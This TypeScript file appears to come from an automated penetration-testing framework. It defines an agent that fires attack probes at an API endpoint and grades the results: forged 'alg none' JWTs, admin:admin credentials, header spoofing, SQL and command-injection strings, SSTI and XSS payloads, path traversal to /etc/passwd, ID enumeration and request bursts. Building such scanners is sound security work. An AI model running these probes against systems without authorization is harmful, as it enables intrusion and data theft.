import * as https from 'https'
import * as http from 'http'
import { BaseAgent, AgentStep, AgentResult, Evidence } from './agent-framework'

async function httpRequest(
  url: string,
  options: { method?: string; headers?: Record<string, string>; body?: string; timeout?: number } = {}
): Promise<{ statusCode: number; headers: Record<string, string>; body: string; time: number } | null> {
  const { method = 'GET', headers = {}, body, timeout = 8000 } = options
  const start = Date.now()
  return new Promise((resolve) => {
    const u = new URL(url)
    const client = u.protocol === 'https:' ? https : http
    const req = client.request({
      hostname: u.hostname, port: u.port || (u.protocol === 'https:' ? 443 : 80),
      path: u.pathname + u.search, method, timeout, rejectUnauthorized: false,
      headers: { 'User-Agent': 'Mozilla/5.0 (OdinForge-Agent/1.0)', 'Accept': '*/*', ...headers }
    }, (res) => {
      const h: Record<string, string> = {}
      for (const [k, v] of Object.entries(res.headers)) h[k.toLowerCase()] = Array.isArray(v) ? v.join(', ') : (v ?? '')
      let b = ''
      res.on('data', (chunk) => { b += chunk.toString().substring(0, 50000) })
      res.on('end', () => resolve({ statusCode: res.statusCode ?? 0, headers: h, body: b, time: Date.now() - start }))
    })
    if (body) req.write(body)
    req.on('error', () => resolve(null))
    req.on('timeout', () => { req.destroy(); resolve(null) })
    req.end()
  })
}

export class ApiEndpointAgent extends BaseAgent {
  name = 'api-endpoint-agent'
  description = 'Deep testing of individual API endpoints: auth bypass, injection, IDOR, rate limit abuse, method tampering, info disclosure'
  handles = [
    'endpoint:no-auth', 'endpoint:weak-auth', 'endpoint:auth-bypass',
    'endpoint:cors-issue', 'endpoint:no-rate-limit', 'endpoint:info-disclosure',
    'endpoint:stale', 'endpoint:method-allowed', 'endpoint:sensitive-data'
  ]

  plan(finding: any): { name: string; description: string }[] {
    const base = [
      { name: 'baseline-request', description: 'Establish a clean baseline response' },
      { name: 'test-auth-bypass', description: 'Attempt authentication bypass techniques' },
      { name: 'test-idor', description: 'Test for Insecure Direct Object References' },
      { name: 'test-injection', description: 'Test for SQL/NoSQL/Command injection in parameters' },
      { name: 'test-method-tampering', description: 'Try unexpected HTTP methods' },
      { name: 'test-rate-limiting', description: 'Rapid-fire requests to test rate limiting' },
      { name: 'test-param-pollution', description: 'HTTP parameter pollution attacks' },
      { name: 'test-verb-tampering', description: 'Override method via X-HTTP-Method-Override' },
      { name: 'test-path-traversal', description: 'Test for directory traversal in path parameters' },
      { name: 'collect-evidence', description: 'Compile all findings and generate evidence package' },
    ]
    return base
  }

  async executeStep(stepName: string, finding: any, previousSteps: AgentStep[]): Promise<string> {
    const url = finding._target
    const method = finding.method ?? 'GET'

    switch (stepName) {
      case 'baseline-request': {
        const res = await httpRequest(url, { method })
        if (!res) return '[ERROR] Could not reach endpoint'
        return `Baseline: ${method} ${url}\n  Status: ${res.statusCode}\n  Content-Type: ${res.headers['content-type'] ?? 'none'}\n  Response Time: ${res.time}ms\n  Body Length: ${res.body.length} chars\n  Server: ${res.headers['server'] ?? 'unknown'}`
      }

      case 'test-auth-bypass': {
        const techniques: { label: string; headers: Record<string, string> }[] = [
          { label: 'No credentials', headers: {} },
          { label: 'Empty Bearer token', headers: { 'Authorization': 'Bearer ' } },
          { label: 'Garbage JWT', headers: { 'Authorization': 'Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.' } },
          { label: 'Algorithm none JWT', headers: { 'Authorization': 'Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.' } },
          { label: 'Basic admin:admin', headers: { 'Authorization': 'Basic YWRtaW46YWRtaW4=' } },
          { label: 'X-Forwarded-For bypass', headers: { 'X-Forwarded-For': '127.0.0.1', 'X-Real-IP': '127.0.0.1' } },
          { label: 'X-Original-URL bypass', headers: { 'X-Original-URL': '/', 'X-Rewrite-URL': '/' } },
        ]

        const results: string[] = []
        const baselineStatus = parseInt(previousSteps.find(s => s.name === 'baseline-request')?.output?.match(/Status: (\d+)/)?.[1] ?? '0')

        for (const tech of techniques) {
          const res = await httpRequest(url, { method, headers: tech.headers })
          if (!res) { results.push(`${tech.label}: [TIMEOUT]`); continue }
          const bypassed = (res.statusCode >= 200 && res.statusCode < 400) && baselineStatus >= 400
          results.push(`${tech.label}: ${res.statusCode} ${bypassed ? '[BYPASS ⚠️]' : ''}`)
        }
        return results.join('\n')
      }

      case 'test-idor': {
        // Test by manipulating IDs in the URL path
        const idPatterns = url.match(/\/(\d+)(\/|$|\?)/)
        if (!idPatterns) {
          return '[SKIP] No numeric ID found in URL path. IDOR testing requires an ID parameter.'
        }
        const originalId = idPatterns[1]
        const testIds = ['1', '0', String(parseInt(originalId) + 1), String(parseInt(originalId) - 1), '99999']
        const results: string[] = []
        for (const testId of testIds) {
          const testUrl = url.replace(`/${originalId}`, `/${testId}`)
          const res = await httpRequest(testUrl, { method })
          if (!res) { results.push(`ID=${testId}: [TIMEOUT]`); continue }
          const accessible = res.statusCode >= 200 && res.statusCode < 400
          results.push(`ID=${testId}: ${res.statusCode} (${res.body.length} bytes) ${accessible ? '[ACCESSIBLE]' : ''}`)
        }
        return `IDOR test (original ID: ${originalId}):\n${results.join('\n')}`
      }

      case 'test-injection': {
        const payloads = [
          { label: 'SQL: single quote', param: "'" },
          { label: 'SQL: OR 1=1', param: "' OR 1=1--" },
          { label: 'SQL: UNION SELECT', param: "' UNION SELECT NULL--" },
          { label: 'SQL: time-based', param: "' OR SLEEP(2)--" },
          { label: 'NoSQL: $gt operator', param: '{"$gt":""}' },
          { label: 'NoSQL: $ne operator', param: '{"$ne":""}' },
          { label: 'Command: semicolon', param: '; ls -la' },
          { label: 'Command: backtick', param: '`id`' },
          { label: 'SSTI: Jinja2', param: '{{7*7}}' },
          { label: 'SSTI: FreeMarker', param: '${7*7}' },
          { label: 'XSS: script tag', param: '<script>alert(1)</script>' },
          { label: 'XSS: img onerror', param: '<img src=x onerror=alert(1)>' },
        ]

        const baselineRes = await httpRequest(url, { method })
        const baselineStatus = baselineRes?.statusCode ?? 0
        const baselineLength = baselineRes?.body?.length ?? 0

        const results: string[] = []
        for (const payload of payloads) {
          const separator = url.includes('?') ? '&' : '?'
          const testUrl = `${url}${separator}test=${encodeURIComponent(payload.param)}`
          const res = await httpRequest(testUrl, { method })
          if (!res) { results.push(`${payload.label}: [TIMEOUT]`); continue }

          const anomalies: string[] = []
          if (res.statusCode === 500) anomalies.push('500 error (possible crash)')
          if (res.time > 3000) anomalies.push(`Slow response (${res.time}ms — possible time-based injection)`)
          if (Math.abs(res.body.length - baselineLength) > 500) anomalies.push(`Response size anomaly (${res.body.length} vs baseline ${baselineLength})`)
          if (res.body.includes(payload.param) && payload.label.includes('XSS')) anomalies.push('Payload reflected in response')
          if (res.body.includes('49') && payload.param.includes('7*7')) anomalies.push('Template expression evaluated!')
          if (res.body.toLowerCase().includes('error') && !baselineRes?.body?.toLowerCase().includes('error')) anomalies.push('New error in response')

          const flag = anomalies.length > 0 ? ` [ANOMALY: ${anomalies.join(', ')}]` : ''
          results.push(`${payload.label}: ${res.statusCode} (${res.body.length}b, ${res.time}ms)${flag}`)
        }
        return results.join('\n')
      }

      case 'test-method-tampering': {
        const methods = ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'HEAD', 'OPTIONS', 'TRACE']
        const results: string[] = []
        for (const m of methods) {
          const res = await httpRequest(url, { method: m })
          if (!res) { results.push(`${m}: [TIMEOUT]`); continue }
          const interesting = (m === 'TRACE' && res.statusCode === 200) ||
                             (m === 'DELETE' && res.statusCode < 400) ||
                             (m === 'PUT' && res.statusCode < 400)
          results.push(`${m}: ${res.statusCode}${interesting ? ' [INTERESTING ⚠️]' : ''}`)
        }
        return results.join('\n')
      }

      case 'test-rate-limiting': {
        const BURST = 20
        const results: number[] = []
        const start = Date.now()

        for (let i = 0; i < BURST; i++) {
          const res = await httpRequest(url, { method, timeout: 3000 })
          results.push(res?.statusCode ?? 0)
        }

        const elapsed = Date.now() - start
        const got429 = results.filter(s => s === 429).length
        const got200 = results.filter(s => s >= 200 && s < 300).length

        if (got429 > 0) {
          return `[RATE LIMITED] ${got429}/${BURST} requests returned 429 (Too Many Requests) in ${elapsed}ms`
        }
        if (got200 === BURST) {
          return `[NO RATE LIMIT] All ${BURST} requests returned 200 in ${elapsed}ms. Endpoint is vulnerable to abuse.`
        }
        return `Results: ${got200} success, ${got429} rate-limited, ${BURST - got200 - got429} other, in ${elapsed}ms`
      }

      case 'test-param-pollution': {
        const separator = url.includes('?') ? '&' : '?'
        const tests = [
          { label: 'Duplicate param', suffix: `${separator}id=1&id=2` },
          { label: 'Array param', suffix: `${separator}id[]=1&id[]=2` },
          { label: 'JSON in param', suffix: `${separator}data={"admin":true}` },
          { label: 'Null byte', suffix: `${separator}file=test%00.html` },
        ]
        const results: string[] = []
        for (const test of tests) {
          const res = await httpRequest(`${url}${test.suffix}`, { method })
          if (!res) { results.push(`${test.label}: [TIMEOUT]`); continue }
          results.push(`${test.label}: ${res.statusCode} (${res.body.length}b)`)
        }
        return results.join('\n')
      }

      case 'test-verb-tampering': {
        const overrideHeaders = [
          { header: 'X-HTTP-Method-Override', value: 'DELETE' },
          { header: 'X-HTTP-Method', value: 'PUT' },
          { header: 'X-Method-Override', value: 'PATCH' },
        ]
        const results: string[] = []
        for (const override of overrideHeaders) {
          const res = await httpRequest(url, { method: 'POST', headers: { [override.header]: override.value } })
          if (!res) { results.push(`${override.header}: ${override.value} → [TIMEOUT]`); continue }
          results.push(`${override.header}: ${override.value} → ${res.statusCode}`)
        }
        return results.join('\n')
      }

      case 'test-path-traversal': {
        const traversals = [
          '../../../etc/passwd',
          '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
          '....//....//....//etc/passwd',
          '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
          '..%252f..%252f..%252fetc%252fpasswd',
        ]
        const results: string[] = []
        for (const payload of traversals) {
          const testUrl = url.replace(/[^/]+$/, payload)
          const res = await httpRequest(testUrl, { method })
          if (!res) { results.push(`${payload.substring(0, 30)}: [TIMEOUT]`); continue }
          const suspicious = res.body.includes('root:') || res.body.includes('[boot loader]')
          results.push(`${payload.substring(0, 30)}: ${res.statusCode} (${res.body.length}b)${suspicious ? ' [PATH TRAVERSAL ⚠️]' : ''}`)
        }
        return results.join('\n')
      }

      case 'collect-evidence': {
        const allOutputs = previousSteps.map(s => `═══ ${s.name} ═══\nStatus: ${s.status}\n${s.output ?? 'No output'}\n`).join('\n')
        const hasAnomaly = allOutputs.includes('[ANOMALY') || allOutputs.includes('[BYPASS') || allOutputs.includes('[INTERESTING')
        const hasNoRateLimit = allOutputs.includes('[NO RATE LIMIT]')
        const hasTraversal = allOutputs.includes('[PATH TRAVERSAL')

        const summary: string[] = []
        if (hasAnomaly) summary.push('⚠️  Injection/bypass anomalies detected')
        if (hasNoRateLimit) summary.push('⚠️  No rate limiting on endpoint')
        if (hasTraversal) summary.push('🚨 Path traversal detected')

        return summary.length > 0
          ? `Evidence Summary:\n${summary.join('\n')}\n\nFull Results:\n${allOutputs}`
          : `No critical findings. Full scan results:\n${allOutputs}`
      }

      default:
        return `Step ${stepName} not implemented`
    }
  }

  analyze(finding: any, steps: AgentStep[]): AgentResult {
    const evidence: Evidence[] = steps.filter(s => s.output).map(s => ({
      type: (s.name.includes('injection') || s.name.includes('traversal') ? 'payload' : 'log') as Evidence['type'],
      label: s.name,
      content: s.output!
    }))

    const allOutput = steps.map(s => s.output ?? '').join('\n')
    const hasBypass = allOutput.includes('[BYPASS')
    const hasInjection = allOutput.includes('[ANOMALY')
    const hasTraversal = allOutput.includes('[PATH TRAVERSAL')
    const hasNoRateLimit = allOutput.includes('[NO RATE LIMIT')
    const hasIDOR = allOutput.includes('[ACCESSIBLE]')

    let severity: AgentResult['severity'] = 'info'
    let exploitable = false

    if (hasTraversal) { severity = 'critical'; exploitable = true }
    else if (hasBypass && hasInjection) { severity = 'critical'; exploitable = true }
    else if (hasBypass) { severity = 'high'; exploitable = true }
    else if (hasInjection) { severity = 'high'; exploitable = true }
    else if (hasIDOR) { severity = 'high'; exploitable = true }
    else if (hasNoRateLimit) { severity = 'medium'; exploitable = false }

    return {
      verified: hasBypass || hasInjection || hasTraversal || hasIDOR,
      exploitable,
      severity,
      evidence,
      recommendations: [
        hasBypass ? 'Fix authentication — ensure all endpoints validate tokens properly' : '',
        hasInjection ? 'Implement parameterized queries and input validation' : '',
        hasTraversal ? 'Sanitize file path inputs — never concatenate user input into file paths' : '',
        hasIDOR ? 'Implement object-level authorization checks' : '',
        hasNoRateLimit ? 'Implement rate limiting (e.g., 100 req/min per IP)' : '',
        'Enable WAF rules for common attack patterns',
      ].filter(Boolean),
      rawOutput: allOutput,
      cweId: hasTraversal ? 'CWE-22' : (hasInjection ? 'CWE-89' : (hasBypass ? 'CWE-287' : (hasIDOR ? 'CWE-639' : null))),
      cvssScore: severity === 'critical' ? 9.8 : (severity === 'high' ? 7.5 : (severity === 'medium' ? 5.3 : null))
    }
  }
}
